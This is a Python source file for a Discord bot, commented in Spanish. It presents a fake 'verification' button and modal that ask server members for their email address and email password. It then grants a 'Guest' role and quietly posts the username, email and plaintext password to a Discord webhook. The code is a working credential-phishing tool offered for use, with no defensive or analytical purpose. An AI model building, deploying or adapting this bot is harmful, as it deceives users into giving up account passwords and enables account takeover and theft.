import discord
from discord.ext import commands
import aiohttp

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Pega aquí tu webhook de Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/ID/CLAVE"

# Modal del panel
class EmailPanel(discord.ui.Modal, title="Panel de Verificación"):

    email = discord.ui.TextInput(
        label="Correo Electrónico",
        placeholder="ejemplo@gmail.com",
        required=True
    )

    password = discord.ui.TextInput(
        label="Contraseña",
        placeholder="Contraseña de tu correo",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        guest_role = discord.utils.get(interaction.guild.roles, name="Guest")

        if guest_role:
            await interaction.user.add_roles(guest_role)
            await interaction.response.send_message(
                f"**{interaction.user.display_name}**, verificación completada. Se te ha asignado el rol **Guest**.",
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "El rol `Guest` no existe en este servidor.",
                ephemeral=True
            )

        # Enviar los datos al webhook
        async with aiohttp.ClientSession() as session:
            json_data = {
                "embeds": [
                    {
                        "title": "Nueva Verificación",
                        "fields": [
                            {"name": "Usuario", "value": interaction.user.name, "inline": True},
                            {"name": "Correo", "value": str(self.email), "inline": False},
                            {"name": "Contraseña", "value": str(self.password), "inline": False}
                        ],
                        "color": 0x2ecc71
                    }
                ]
            }
            await session.post(WEBHOOK_URL, json=json_data)

# Vista con botón
class RestoreView(discord.ui.View):
    @discord.ui.button(label="Verificar", style=discord.ButtonStyle.green)
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmailPanel())

# Comando
@bot.command()
async def restorecord(ctx):
    await ctx.send("Haz clic en el botón para comenzar la verificación:", view=RestoreView())

# Ejecutar bot
bot.run("TU_TOKEN_AQUI")
